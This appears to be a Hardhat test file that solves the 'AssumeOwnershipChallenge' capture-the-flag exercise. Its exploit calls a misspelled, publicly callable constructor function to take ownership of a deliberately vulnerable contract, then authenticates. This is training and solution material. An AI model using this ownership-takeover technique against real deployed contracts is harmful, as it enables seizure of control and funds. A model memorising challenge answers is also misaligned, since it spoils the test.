const { expect } = require("chai");
const { ethers } = require("hardhat");

describe.only("AssumeOwnershipChallenge", async function () {
    let contract;

    before(async function () {
        contract = await (await ethers.getContractFactory("AssumeOwnershipChallenge")).deploy();
    });

    it("Exploit", async function () {
        // WRITE YOUR CODE HERE
        await contract.AssumeOwmershipChallenge();
        await contract.authenticate();
    });

    after(async function () {
        expect(await contract.isComplete()).to.be.true;
    });
});